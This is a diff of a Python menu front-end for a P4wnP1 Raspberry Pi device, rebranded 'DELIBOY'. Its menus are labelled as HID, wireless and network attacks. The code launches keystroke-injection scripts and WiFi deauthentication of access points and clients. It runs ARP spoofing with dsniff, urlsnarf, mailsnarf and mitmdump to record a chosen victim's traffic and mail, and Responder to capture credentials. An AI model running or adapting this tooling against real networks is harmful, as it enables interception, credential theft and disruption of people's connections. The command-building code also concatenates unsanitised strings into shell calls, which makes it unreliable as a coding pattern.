@@ -121,23 +121,35 @@ def readCapacity(bus):
     capacity = swapped / 256
     return capacity
 
-def execCmd(cmd):
-    result = ""
+def execCmd(cmd: str, skipError=False):
+    result = None
     try:
         result = str(subprocess.check_output(cmd, shell=True))
     except subprocess.CalledProcessError:
         result = -1
 
     # if we failed to run the command
-    if result == -1:
+    if result == -1 and skipError is not True:
         displayErrorNew("error when running", cmd)
-        time.sleep(5)
+        time.sleep(3)
         return ()
-    
     return result
 
+def execCmdInBackground(cmd: str):
+    result = None
+    try:
+        result = subprocess.Popen(cmd.split())
+    except subprocess.CalledProcessError:
+        result = -1
 
-def execCmdNoStr(cmd):
+    # if we failed to run the command
+    if result == -1:
+        displayErrorNew("error when running", cmd)
+        time.sleep(3)
+        return None
+    return result
+
+def execCmdNoStr(cmd: str):
     try:
         return subprocess.check_output(cmd, shell=True)
     except subprocess.CalledProcessError:
@@ -152,79 +164,57 @@ def displayErrorNew(error1, error2):
     displayText("", "", error1, error2, "", "", "")
     time.sleep(5)
 
+# todo: replace with tmuxRun
+
 def autoKillCommand(tx1, t):
-    tx2 = "timeout " + str(t) + "s" + tx1
+    #tx2 = "timeout " + str(t) + "s" + tx1
     cmd = (
         "touch touchedcommand.sh && echo '#!/bin/bash\n"
         + tx1
         + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
     )
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        displayErrorNew("execCmd returned -1")
-        return ()
     Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
     # displayText("","","Executed","","","","")
     time.sleep(t)
     # print(cmd)
     # subprocess.call(["timeout 2s",str(cmd)])
     ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
-    cmd = "rm nohup.out && rm touchedcommand.sh"
-    toDEl = execCmd(cmd)
-    if toDEl == -1:
+    cmd = "rm -f nohup.out && rm -f touchedcommand.sh"
+    result = execCmd(cmd)
+    if result == -1:
         displayError()
         return -1
-    errore = 0
-    while errore == 0:
+    error = 0
+    while error == 0:
         cmd = "ps -aux | grep '" + tx1 + "' | head -n 1 | cut -d ' ' -f7"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            time.sleep(5)
-            return ()
         cmd = "kill " + (str(result).split("'")[1])[:-2]
         # print(cmd)
         result = execCmd(cmd)
         if result == -1:
-            # print("errore nella kill")
-            # displayError()
-            time.sleep(5)
-            errore = 1
+            error = 1
     return True
 
 
 def killCommand(cmd):
-    errore = 0
-    while errore == 0:
+    error = 0
+    while error == 0:
         cmd = "ps -aux | grep '" + cmd + "' | head -n 1 | cut -d ' ' -f7"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            time.sleep(5)
-            return ()
         cmd = "kill " + (str(result).split("'")[1])[:-2]
         # print(cmd)
         result = execCmd(cmd)
         if result == -1:
-            # print("errore nella kill")
-            # displayError()
-            errore = 1
-    errore = 0
-    while errore == 0:
+            error = 1
+    error = 0
+    while error == 0:
         cmd = "ps -aux | grep '" + cmd + "' | head -n 1 | cut -d ' ' -f8"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            time.sleep(5)
-            return ()
         cmd = "kill " + (str(result).split("'")[1])[:-2]
-        # print(cmd)
         result = execCmd(cmd)
         if result == -1:
-            # print("errore nella kill")
-            # displayError()
-            errore = 1
+            error = 1
     return ()
 
 
@@ -235,18 +225,14 @@ def autoKillCommandNoKill(tx1, t):
         + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
     )
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
     # displayText("","","Executed","","","","")
     # print(cmd)
     # subprocess.call(["timeout 2s",str(cmd)])
     ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
-    cmd = "rm nohup.out && rm touchedcommand.sh"
-    toDEl = execCmd(cmd)
-    if toDEl == -1:
-        displayError()
+    cmd = "rm -f nohup.out && rm -f touchedcommand.sh"
+    result = execCmd(cmd)
+    if result == -1:
         return -1
     return 1
 
@@ -305,8 +291,8 @@ def checklist(_list):
             menu = 1
         else:  # button is pressed:
             cur = cur + 1
-            if cur > maximum - 2:
-                cur = maximum - 2
+            if cur > maximum - 1:
+                cur = maximum - 1
         if not GPIO.input(KEY_LEFT_PIN):  # button is released
             return ()
         if GPIO.input(KEY_RIGHT_PIN):  # button is released
@@ -356,27 +342,32 @@ def shell(cmd):
 
 def switchMenu(argument):
     switcher = {
-        0: "_  P4wnP1 A.L.O.A",
-        1: "_SYSTEM RELATED",
-        2: "_HID MANAGEMENT",
-        3: "_WIRELESS THINGS",
-        4: "_TRIGGERS FEATURES",
-        5: "_TEMPLATES FEATURES",
-        6: "_MITM TOOLS",
-        7: "_System information",
-        8: "_OLED brightness",
-        9: "_HOST OS detection",
-        10: "_Display OFF",
-        11: "_Keys Test",
+        # main menu
+        #  |                     |<-- this character isn't visible
+        0: "_      DELIBOY       |",
+        1: "_SYSTEM SETTINGS",
+        2: "_HID ATTACKS",
+        3: "_WIRELESS ATTACKS",
+        4: "_TRIGGERS",
+        5: "_TEMPLATES",
+        6: "_NETWORK ATTACKS",
+        # SYSTEM SETTINGS
+        7: "_System Information",
+        8: "_OLED Brightness",
+        9: "_HOST OS Detection",
+        10: "_Display Off",
+        11: "_Key Test",
         12: "_Reboot GUI",
-        13: "_System shutdown",
-        14: "_RUN HID script",
-        15: "_GAMEPAD",
-        16: "_MOUSE",
+        13: "_Reboot System",
+        # HID Attacks
+        14: "_Run HIDScript",
+        15: "_Key Gamepad",
+        16: "_Emulate Mouse",
         17: "_Set Typing Speed",
-        18: "_Set Key layout",
+        18: "_Set Key Layout",
         19: "_",
         20: "_",
+        # Wireless Attacks
         21: "_Scan WIFI AP",
         22: "_Hosts Discovery",
         23: "_Nmap",
@@ -384,6 +375,7 @@ def switchMenu(argument):
         25: "_Deauther-Bcast",
         26: "_Deauther-Client",
         27: "_",
+        # triggers
         28: "_Send to oled group",
         29: "_",
         30: "_",
@@ -391,6 +383,7 @@ def switchMenu(argument):
         32: "_",
         33: "_",
         34: "_",
+        # templates
         35: "_FULL SETTINGS",
         36: "_BLUETOOTH",
         37: "_USB",
@@ -398,37 +391,46 @@ def switchMenu(argument):
         39: "_TRIGGER ACTIONS",
         40: "_NETWORK",
         41: "_",
-        42: "_ArpSpoofing",
-        43: "_",
+        # network attacks
+        42: "_(Broken)ArpSpoofing",
+        43: "_Responder",
         44: "_",
         45: "_",
         46: "_",
         47: "_",
         48: "_",
-        # newmenu
-        49: "_WIRED THINGS",
-        50: "_newsubmenu2",
+        # main menu page 2
+        49: "_USBETH ATTACKS",
+        50: "_TEST MENU",
         51: "_newsubmenu3",
         52: "_newsubmenu4",
         53: "_newsubmenu5",
         54: "_newsubmenu6",
-        55: "_UpdateOledMenu",
-        # newsections
-        56: "_Nmap 172.16.0.2",
+        55: "_UPDATE OLED MENU",
+        # usbeth attacks
+        56: "_Nmap USB Device (x.2)",
         57: "_",
         58: "_",
         59: "_",
         60: "_",
         61: "_",
         62: "_",
-        # newsections
-        63: "_",
-        64: "_",
-        65: "_",
-        66: "_",
+        # tests
+        63: "_Test (+7)",
+        64: "_Test (<7)",
+        65: "_Select Network Interface",
+        66: "_New Home Menu",
         67: "_",
         68: "_",
         69: "_",
+        #
+        70: "_",
+        71: "_",
+        72: "_",
+        73: "_",
+        74: "_",
+        75: "_",
+        76: "_",
     }
     return switcher.get(argument, "Invalid")
 
@@ -440,76 +442,17 @@ def about():
         "P4wnP1 (c) @Mame82",
         "V 1.0",
         "This GUI is improved by",
-        "Fuocoman",
+        "DELIFER, Fuocoman",
         "Original Code by",
         "BeBoXoS",
     )
     while GPIO.input(KEY_LEFT_PIN):
         # wait
         menu = 1
-    page = 0
+    #page = 0
 
 
-# system information sub routine
-def systemInfo():
-    while GPIO.input(KEY_LEFT_PIN):
-        now = datetime.datetime.now()
-        today_time = now.strftime("%H:%M:%S")
-        today_date = now.strftime("%d %b %y")
-        cmd = "hostname -I"
-        result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
-        IP = result.split(" ")[0]
-        IP2 = result.split(" ")[1]
-        IP3 = result.split(" ")[2]
 
-        if UPS == 1:
-            # volt = "BAT :%5.2fV " % readVoltage(bus) #Battery Voltage is irrelevant and takes too much space on screen
-            batt = int(readCapacity(bus))
-            if batt > 100:
-                batt = 100
-            batt = " BAT: " + str(batt) + "%"
-        else:
-            batt = " BAT: N/C"
-
-        # BattTemp = volt + str(batt) + "% t:" + str(temp)
-        # print(str(subprocess.check_output(cmd, shell = True )))
-        cmd = "top -bn1 | grep %Cpu | awk '{printf \"%.0f\",$2}'"
-        result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
-        temp = os.popen("cat /sys/class/thermal/thermal_zone0/temp").readline()
-        temp = int(temp) / 1000
-        CPU = "CPU.:" + result.split("'")[1] + "% TEMP:" + str(temp)
-        cmd = "free -m | awk 'NR==2{printf \"MEM :%.2f%%\", $3*100/$2 }'"
-        result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
-        MemBat = result.split("'")[1] + batt
-        cmd = 'df -h | awk \'$NF=="/"{printf "Disk: %d/%dGB %s", $3,$2,$5}\''
-        result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
-        Disk = result.split("'")[1]
-        # print(str(IP3))
-        if str(IP3) == str("\\n'"):
-            IP3 = "refresh the Connection"
-        displayText(
-            today_date + " " + today_time,
-            str(CPU),
-            str(MemBat),
-            Disk,
-            "WIFI: " + IP.split("'")[1],
-            "BTH.: " + str(IP3),
-            "USB.: " + str(IP2),
-        )
-        time.sleep(0.1)
-    # page = 7
 
 
 def identifyOS(ips):
@@ -529,7 +472,8 @@ def osDetails(ips):
     )
 
 
-def setContrast(contrast):
+def setContrast():
+    contrast = brightness
     # set contrast 0 to 255
     if SCNTYPE == 1:
         while GPIO.input(KEY_LEFT_PIN):
@@ -565,7 +509,7 @@ def setContrast(contrast):
 
 def splash():
     img_path = os.path.abspath(
-        os.path.join(os.path.dirname(__file__), "images", "bootwhat.bmp")
+        os.path.join(os.path.dirname(__file__), "images", "bootdefcon.bmp")
     )
     splash = (
         Image.open(img_path)
@@ -578,7 +522,7 @@ def splash():
         .convert(device.mode)
     )
     device.display(splash)
-    time.sleep(5)  # 5 sec splash boot screen
+    time.sleep(3)  # 3 sec splash boot screen
 
 
 def screenOff():
@@ -662,9 +606,6 @@ def keyTest():
 def fileSelect(path, ext):
     cmd = "ls -F --format=single-column  " + path + "*" + ext
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     listattack = result.split("'")[1]
     listattack = listattack.replace(ext, "")
     listattack = listattack.replace(path, "")
@@ -788,8 +729,8 @@ def templateSelect(list):
         )
         time.sleep(0.1)
 
-
-def runhid():
+# todo: rewrite this mess
+def runHidScript():
     # choose and run (or not) a script
     file = fileSelect(hidpath, ".js")
     time.sleep(0.5)
@@ -857,32 +798,33 @@ def runhid():
                 answer = 3
         if answer == 2:
             return ()
-        displayText("", "", "", "HID Script running...", "", "", "")
+        displayText("", "", "", "HIDScript running...", "", "", "")
         if answer == 1:
             # run as background job P4wnP1_cli hid job command
             cmd = "P4wnP1_cli hid job '" + file + "'"
             result = execCmd(cmd)
-            if result == -1:
-                displayError()
-                return ()
             return ()
         if answer == 3:
             # run hid script directly
             cmd = "P4wnP1_cli hid run '" + file + "'"
-            result = execCmd(cmd)
-            if result == -1:
-                displayError()
-                return ()
+            execCmd(cmd)
             return ()
 
 
 def restart():
-    displayText("", "", "", "PLEASE WAIT ...", "", "", "")
-    cmd = "python3.7 /root/BeBoXGui/runmenu.py &"
-    result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
+    displayText("", "", "", "hang on...", "", "", "")
+    cmd = "python3 /root/DeliMenu/new.py &"
+    execCmd(cmd)
+    return ()
+
+def reboot():
+    displayText("","","","  bye bye!","","","")
+    execCmd("reboot")
+    return ()
+
+def shutdown():
+    displayText("","","","  bye bye!","","","")
+    execCmd("shutdown now")
     return ()
 
 
@@ -891,9 +833,6 @@ def GetTemplateList(type):
     # Possible types : FULL_SETTINGS , BLUETOOTH , USB , WIFI , TRIGGER_ACTIONS , NETWORK
     cmd = "P4wnP1_cli template list"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     list = result
     list = list.replace("Templates of type ", "")  # remove uwanted text
     list = list.replace(" :", "")
@@ -911,7 +850,7 @@ def GetTemplateList(type):
     return result
 
 
-def ApplyTemplate(template, section):
+def applyTemplate(template, section):
     print(template)
     print(section)
     # displayText(
@@ -950,14 +889,11 @@ def ApplyTemplate(template, section):
             return ()
         time.sleep(0.5)  # pause
         cmd = "P4wnP1_cli template deploy -" + section + " " + template + ""
-        result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
+        execCmd(cmd)
         return ()
 
 
-def Gamepad():
+def emuGamepad():
     if SCNTYPE == 1:
         while GPIO.input(KEY_PRESS_PIN):
             with canvas(device) as draw:
@@ -1025,7 +961,7 @@ def Gamepad():
                     draw.ellipse(
                         (100, 20, 120, 40), outline=255, fill=1
                     )  # B button filled
-                    result = subprocess.check_output(
+                    subprocess.check_output(
                         "P4wnP1_cli hid run -c 'press(\"W\")'", shell=True
                     )
 
@@ -1035,12 +971,12 @@ def Gamepad():
                     draw.ellipse(
                         (70, 40, 90, 60), outline=255, fill=1
                     )  # A button filled
-                    result = subprocess.check_output(
+                    subprocess.check_output(
                         "P4wnP1_cli hid run -c 'press(\"E\")'", shell=True
                     )
 
 
-def Mouse():
+def emuMouse():
     button1 = 0
     button2 = 0
     step = 10
@@ -1230,18 +1166,12 @@ def scanwifi():
     # list wifi APs
     cmd = "sudo iwlist wlan0 scan | grep ESSID"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     SSID = result.split("'")[1]
     SSID = SSID.replace("                    ESSID:", "")
     SSID = SSID.replace('"', "")
     ssidlist = SSID.split("\\n")
     cmd = "sudo iwlist wlan0 scan | grep Encryption"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     Ekey = result.split("'")[1]
     Ekey = Ekey.replace("                    Encryption ", "")
     Ekeylist = Ekey.split("\\n")
@@ -1530,9 +1460,6 @@ def hostselect():
     displayText("", "", "", "wait, may take a while ", "", "", "")
     cmd = "hostname -I"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     subnetIp = result.split(" ")[0].split("'")[1]
     pos = subnetIp.rfind(".")
     cmd = (
@@ -1543,9 +1470,6 @@ def hostselect():
         + "'"
     )
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     hosts = result
     hostlist = hosts.split("\\n")
     del hostlist[-1]
@@ -1597,8 +1521,8 @@ def hostselect():
             menu = 1
         else:  # button is pressed:
             cur = cur + 1
-            if cur > maximum - 2:
-                cur = maximum - 2
+            if cur > maximum - 1:
+                cur = maximum - 1
         if GPIO.input(KEY_RIGHT_PIN):  # button is released
             menu = 1
         else:  # button is pressed:
@@ -1616,8 +1540,8 @@ def hostselect():
 
 def nmap():
     selected = hostselect()
-    choise = 0
-    while choise == 0:
+    choice = 0
+    while choice == 0:
         displayText(
             "                  YES",
             "",
@@ -1628,29 +1552,20 @@ def nmap():
             "                   NO",
         )
         if not GPIO.input(KEY1_PIN):  # button is released
-            choise = 1  # A button
+            choice = 1  # A button
         if not GPIO.input(KEY3_PIN):  # button is released
-            choise = 2
+            choice = 2
     displayText("", "", "", "    wait ", "", "", "")
 
-    if choise == 1:
+    if choice == 1:
         cmd = "nmap -Pn -A -v " + selected + " > nmap/" + selected + ".txt"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
 
         cmd = "cat " + "nmap/" + selected + ".txt |  grep -v Discovered | grep  tcp"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
     else:
         cmd = "nmap -Pn -A " + selected + " | grep tcp"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
 
     result = str(result).split("'")[1].split("\\n")[:-1]
     print(result)
@@ -1674,8 +1589,8 @@ def nmap():
 
 def nmapLocal():
     selected = "172.16.0.2"
-    choise = 0
-    while choise == 0:
+    choice = 0
+    while choice == 0:
         displayText(
             "                  YES",
             "",
@@ -1686,17 +1601,14 @@ def nmapLocal():
             "                   NO",
         )
         if not GPIO.input(KEY1_PIN):  # button is released
-            choise = 1  # A button
+            choice = 1  # A button
         if not GPIO.input(KEY3_PIN):  # button is released
-            choise = 2
+            choice = 2
     displayText("", "", "", "    wait ", "", "", "")
 
-    if choise == 1:
+    if choice == 1:
         cmd = "nmap -Pn -A " + selected
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
         f = open("nmap/" + str(selected) + ".txt", "w+")
         reportList = str(result).split("'")[1].split("\\n")
         for line in reportList:
@@ -1705,15 +1617,9 @@ def nmapLocal():
         f.close()
         cmd = "cat " + selected + ".txt | grep tcp"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
     else:
         cmd = "nmap -Pn -A " + selected + " | grep tcp"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
 
     result = str(result).split("'")[1].split("\\n")[:-1]
     print(result)
@@ -1774,10 +1680,6 @@ def vulnerabilityScan():
     filePath = "/root/BeBoXGui/nmap/" + selected
     cmd = "cat " + filePath + " |  grep -v Discovered | grep  tcp"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        time.sleep(5)
-        return ()
     toSearch = str(result).split("'")[1].split("\\n")
     del toSearch[-1]
     founded = 0
@@ -1788,66 +1690,55 @@ def vulnerabilityScan():
         print("search for: " + i)
         cmd = "searchsploit " + "'" + str(i) + "'"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            time.sleep(5)
         if (str(result).split("'")[1])[1] == "-":
             founded += 1
     print(founded)
     displayText("", "", "", "founded: " + str(founded), "", "", "")
     time.sleep(5)
 
+def enableMonitorMode():
+    displayText("","","enabling", "monitor mode","","","")
+    execCmd("airmon-ng start wlan0")
+    displayText("","","monitor mode", "enabled!","","","")
+    time.sleep(0.5)
+
+def disableMonitorMode():
+    displayText("","","disabling", "monitor mode","","","")
+    execCmd("airmon-ng stop wlan0mon")
+    displayText("","","monitor mode", "disabled!","","","")
+    time.sleep(0.5)
 
 def getSSID():
     # return [name,channel,mac]
-    displayText("", "", "wait", "", "", "", "")
+    displayText("", "", "please wait", "scanning ssids", "", "", "")
     # list wifi APs
     cmd = "airmon-ng start wlan0 && airmon-ng start wlan0mon"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     try:
         cmd = "touch touchedcommand.sh && echo '#!/bin/bash\nairodump-ng wlan0mon -w reportAiro -a &' > touchedcommand.sh && chmod +x touchedcommand.sh"
         result = execCmd(cmd)
-        if result == -1:
-            displayError()
-            return ()
         # Popen(['nohup','/bin/bash','/root/BeBoXGui/update.sh'], stdout=open('/dev/null','w'), stderr=open('/dev/null','a'),>
         Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
         displayText("", "", "wait", "", "", "", "")
         time.sleep(10)
-        errore = 0
-        while errore == 0:
-            cmd = "ps -aux | grep 'airodump-ng wlan0mon -w reportAiro -a' | head -n 1 | cut -d ' ' -f7"
+        error = 0
+        while error == 0:
+            cmd = "ps -aux | grep 'airodump-ng wlan0mon -w reportAiro -a' | grep -v grep | head -n 1 | awk '{ print $2 }'"
             result = execCmd(cmd)
-            if result == -1:
-                displayError()
-                time.sleep(5)
-                return ()
             cmd = "kill " + (str(result).split("'")[1])[:-2]
             # print(cmd)
-            result = execCmd(cmd)
+            result = execCmd(cmd, skipError=True)
             if result == -1:
-                # print("errore nella kill")
-                # displayError()
-                time.sleep(5)
-                errore = 1
+                error = 1
 
     except:
-        displayError()
+        displayErrorNew("failed to get ssids")
         time.sleep(5)
         return ()
     cmd = "cat reportAiro-01.csv"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
-    cmd = "rm -rf reportAiro* && rm nohup.out && rm touchedcommand.sh"
-    toDEl = execCmd(cmd)
-    if toDEl == -1:
-        displayError()
-        return ()
+    cmd = "rm -rf reportAiro* && rm -f nohup.out && rm -f touchedcommand.sh"
+    execCmd(cmd)
     result = str(result).replace("\\r", "").split("\\n")
     del result[0]
     del result[0]
@@ -1935,7 +1826,7 @@ def deauther():
         target = target.split(",")
         print(target[2])
     except:
-        displayError()
+        displayErrorNew("error finding targets")
         return ()
 
     # cmd = "airodump-ng -c " + str(target[1] )+" --bssid " + str(target[2]) + " wlan0mon && echo 'finito' "
@@ -1953,10 +1844,7 @@ def deauther():
         + tx1
         + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
     )
-    result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
+    execCmd(cmd)
     Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
     displayText("", "", "set the channel", "", "", "", "")
     time.sleep(4)
@@ -1968,18 +1856,12 @@ def deauther():
         + tx2
         + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
     )
-    result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
+    execCmd(cmd)
     Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
     displayText("", "", "doing the stuff", "", "", "", "")
     time.sleep(10)
-    cmd = "rm touchedcommand.sh"
-    toDEl = execCmd(cmd)
-    if toDEl == -1:
-        displayError()
-        return ()
+    cmd = "rm -f touchedcommand.sh"
+    execCmd(cmd)
     return ()
 
 
@@ -2016,9 +1898,6 @@ def deautherClient():
         return ()
     cmd = "cat result-01.csv"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     result = str(result).replace("\\r", "").split("\\n")
     toRemove = result.index(
         "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
@@ -2053,64 +1932,61 @@ def deautherClient():
     if autoKillCommand(tx2, 30) == -1:
         displayError()
         return ()
+
+    cmd = "killall airodump-ng && killall aireplay-ng"
+    execCmd(cmd)
+
     displayMsg("Done", 4)
     cmd = "rm -rf result*"
-    result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
+    execCmd(cmd)
 
     return ()
 
-
+# todo: this shit is broken
+# execCmd run in background, nohup or & or something
+# mitmdump is no longer available on pi zero...
+# prolly better off making services we can enable disable
 def arpSpoof():
     myTime = 86400
-    displayMsg("select target", 3)
+    displayMsg("scanning for hosts", 3)
     victimIP = hostselect()
     displayMsg("Please Wait", 1)
     cmd = "sysctl -w net.ipv4.ip_forward=1"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
 
     cmd = "ip r | grep default |  head -n 1 | cut -d ' ' -f3"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     routerIp = (str(result).split("'")[1])[:-2]
     print(routerIp)
     print(victimIP)
     cmd1 = "arpspoof -i wlan0 -t " + str(victimIP) + " " + str(routerIp)
     cmd2 = "arpspoof -i wlan0 -t " + str(routerIp) + " " + str(victimIP)
-    cmd3 = cmd1 + "&\n" + cmd2
+    cmd3 = cmd1 + " &\n" + cmd2 + " &"
     if autoKillCommandNoKill(cmd3, myTime) == -1:
         displayError()
         return ()
-    cmd1 = " iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
-    cmd2 = " iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080"
+    #execCmd(cmd3)
+    cmd1 = "iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
+    cmd2 = "iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080"
     execCmd(cmd1)
     execCmd(cmd2)
 
     cmdDsniff = "dsniff -i wlan0 -w Dsniff" + str(victimIP) + ".txt"
-    if autoKillCommandNoKill(cmdDsniff, myTime) == -1:
-        displayError()
-        return ()
     cmdUrl = "urlsnarf -i wlan0 > Url" + str(victimIP) + ".clf"
-    if autoKillCommandNoKill(cmdUrl, myTime) == -1:
-        displayError()
-        return ()
-    cmdMIMT = (
+    cmdMITM = (
         " mitmdump --mode transparent --showhost -w Mitm" + str(victimIP) + ".mitm"
     )
-    if autoKillCommandNoKill(cmdMIMT, myTime) == -1:
-        displayError()
-        return ()
     cmdMail = "mailsnarf -i wlan0 > Mail" + str(victimIP) + ".mbox"
-    if autoKillCommandNoKill(cmdMail, myTime) == -1:
-        displayError()
-        return ()
+
+    displayMsg("dsniff", 1)
+    execCmd(cmdDsniff)
+    displayMsg("urlsnarf", 1)
+    execCmd(cmdUrl)
+    displayMsg("mitmdump", 1)
+    execCmd(cmdMITM)
+    displayMsg("mailsnarf", 1)
+    execCmd(cmdMail)
+
     time.sleep(10)
     uscire = 0
     while uscire == 0:
@@ -2120,30 +1996,319 @@ def arpSpoof():
             uscire = 1
         displayMsg("press right to exit", 0.2)
 
-    killCommand("dsniff")
-    killCommand("urlsnarf")
-    killCommand("mitm")
-    killCommand("mailsnarf")
-    killCommand("arpspoof")
-    killCommand("arpspoof")
+    #killCommand("dsniff")
+    #killCommand("urlsnarf")
+    #killCommand("mitm")
+    #killCommand("mailsnarf")
+    # killCommand("arpspoof")
+    # killCommand("arpspoof")
+
+    execCmd("killall dsniff")
+    execCmd("killall urlsnarf")
+    execCmd("killall mailsnarf")
+    execCmd("killall arpspoof")
 
     cmd = "iptables-legacy -t nat -F"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
     cmd = "sysctl -w net.ipv4.ip_forward=0"
     result = execCmd(cmd)
-    if result == -1:
-        displayError()
-        return ()
 
+
+# system information sub routine
+def systemInfo():
+    while GPIO.input(KEY_LEFT_PIN):
+        now = datetime.datetime.now()
+        today_time = now.strftime("%H:%M:%S")
+        today_date = now.strftime("%d %b %y")
+        cmd = "hostname -I"
+        result = execCmd(cmd)
+
+        IP = result.split(" ")[0]
+        IP2 = result.split(" ")[1]
+        IP3 = result.split(" ")[2]
+
+        if UPS == 1:
+            # volt = "BAT :%5.2fV " % readVoltage(bus) #Battery Voltage is irrelevant and takes too much space on screen
+            batt = int(readCapacity(bus))
+            if batt > 100:
+                batt = 100
+            batt = " BAT: " + str(batt) + "%"
+        else:
+            batt = " BAT: N/C"
+
+        # BattTemp = volt + str(batt) + "% t:" + str(temp)
+        # print(str(subprocess.check_output(cmd, shell = True )))
+        cmd = "top -bn1 | grep %Cpu | awk '{printf \"%.0f\",$2}'"
+        result = execCmd(cmd)
+        temp = os.popen("cat /sys/class/thermal/thermal_zone0/temp").readline()
+        temp = int(temp) / 1000
+        CPU = "CPU.:" + result.split("'")[1] + "% TEMP:" + str(temp)
+        cmd = "free -m | awk 'NR==2{printf \"MEM :%.2f%%\", $3*100/$2 }'"
+        result = execCmd(cmd)
+        MemBat = result.split("'")[1] + batt
+        cmd = 'df -h | awk \'$NF=="/"{printf "Disk: %d/%dGB %s", $3,$2,$5}\''
+        Disk = result.split("'")[1]
+        # print(str(IP3))
+        if str(IP3) == str("\\n'"):
+            IP3 = "refresh the Connection"
+        displayText(
+            today_date + " " + today_time,
+            str(CPU),
+            str(MemBat),
+            Disk,
+            "WIFI: " + IP.split("'")[1],
+            "BTH.: " + str(IP3),
+            "USB.: " + str(IP2),
+        )
+        time.sleep(0.1)
+    # page = 7
+
+
+def menuResponderAttack():
+    print("Responder")
+    interface = ""
+    while GPIO.input(KEY_LEFT_PIN):
+        responder_status = checkResponder()
+
+        menu_responder = {
+            "Interface: " + str(interface): selectNetworkInterface,
+        }
+
+        if interface != "":
+            menu_responder["Run"] = runResponder
+
+        print(responder_status)
+        if responder_status:
+            menu_responder = {
+                "Stop Job": killResponder
+            }
+
+        selection = None
+        selection = scrollDictMenu(menu_responder)
+        print("responder status: " + str(selection))
+
+        if selection is not None:
+            if selection == selectNetworkInterface:
+                interface = selectNetworkInterface()
+            elif selection == runResponder:
+                displayText("","","","starting","","","")
+                runResponder(interface)
+                displayText("","","","responder is running","","","")
+                time.sleep(0.5)
+            elif selection == killResponder:
+                displayText("","","","killing responder","","","")
+                killResponder()
+                displayText("","","","responder is dead","","","")
+                time.sleep(0.5)
+
+def runResponder(interface: str):
+    cmd = "python3 /opt/Responder/Responder.py -I " + interface + " -w -F -P -v"
+    result = execCmdInBackground(cmd)
+    #print(result)
+
+def checkResponder():
+    cmd = "ps -aux | grep -i responder | grep -v grep | awk '{ print $2 }'"
+    pid = execCmd(cmd)
+    len(pid)
+    print(pid + " " + str(len(pid)))
+    if pid.isdigit():
+        print("pid of responder is " + str(pid))
+        return pid
+    return False
+
+def killResponder():
+    pid = checkResponder()
+
+    if pid.isdigit():
+        print("pid of responder is " + str(pid))
+        displayMsg("killing " + str(pid), 0.3)
+        execCmd("kill -9 " + str(pid))
+
+def scrollMenu(items: list):
+    time.sleep(0.1)
+    maximum = len(items)
+    currentline = 0
+    lines = ["", "", "", "", "", "", ""]
+    # while you haven't pushed the back button
+    while True:
+        # we loop
+
+        # back out
+        if not GPIO.input(KEY_LEFT_PIN):  # button is released
+            print("Left button pressed in scrollMenu")
+            time.sleep(0.1)
+            return None
+
+        # calculate the start and end index of the displayed items
+        start_index = currentline
+        end_index = currentline + 7
+        if end_index > maximum:
+            end_index = maximum
+            start_index = maximum - 7
+            if start_index < 0:
+                start_index = 0
+
+        # populate the lines with the displayed items
+        for n in range(start_index, end_index):
+            if n == currentline:
+                lines[n-start_index] = ">" + items[n]
+            else:
+                lines[n-start_index] = " " + items[n]
+
+        # controls
